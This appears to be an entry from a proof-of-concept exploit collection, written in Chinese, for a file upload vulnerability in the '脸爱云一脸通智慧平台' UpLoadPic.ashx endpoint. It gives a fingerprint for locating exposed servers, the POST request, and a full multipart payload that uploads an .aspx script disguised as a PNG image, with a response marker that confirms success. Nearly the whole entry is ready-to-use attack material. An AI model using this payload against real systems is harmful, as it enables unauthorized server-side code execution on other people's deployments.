# 脸爱云一脸通智慧平台UpLoadPic文件上传漏洞

脸爱云一脸通智慧平台UpLoadPic ｜ 文件上传 ｜ —
- **指纹**：`body="View/UserReserved/UserReservedTest.aspx"`
- **请求**：`POST /UpLoadPic.ashx HTTP/1.1`

**Payload**
```
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="action"
post
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="myPhoto"; filename="dudesite.aspx"
Content-Type: image/png
<% response.write("FC5E038D38A57032085441E7FE7010B0") %>
------WebKitFormBoundarywt7cEu1eBdibB13u
Content-Disposition: form-data; name="oldName"
------WebKitFormBoundarywt7cEu1eBdibB13u--
```
- **响应特征**：200 images